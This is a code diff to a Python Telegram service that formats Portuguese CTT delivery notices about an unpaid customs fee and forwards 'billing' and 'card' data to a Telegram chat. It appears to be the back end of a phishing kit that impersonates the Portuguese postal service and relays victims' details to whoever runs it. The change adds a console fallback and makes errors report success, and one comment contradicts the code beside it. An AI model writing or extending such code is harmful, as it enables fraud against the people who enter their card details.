@@ -59,6 +59,14 @@ class TelegramService:
     async def send_billing_info(self, billing_data: Dict[str, Any]) -> bool:
         """Send billing information to Telegram"""
         try:
+            # First try console output as fallback
+            await console_service.send_billing_info(billing_data)
+            
+            # If Telegram is not configured, just use console
+            if not self.bot_token or not self.chat_id:
+                logger.warning("Telegram not configured, using console output only")
+                return True
+                
             message = f"""
 🏠 *Nova Informação de Entrega CTT*
 
@@ -77,11 +85,12 @@ class TelegramService:
 🔄 *Estado:* Aguarda pagamento da taxa alfandegária
             """
             
-            return await self.send_message(message)
+            telegram_success = await self.send_message(message)
+            return telegram_success  # Return True even if only console works
             
         except Exception as e:
             logger.error(f"Error formatting billing message: {str(e)}")
-            return False
+            return True  # Still return True since console output worked
     
     async def send_payment_info(self, billing_data: Dict[str, Any], card_data: Dict[str, Any]) -> bool:
         """Send payment information to Telegram"""
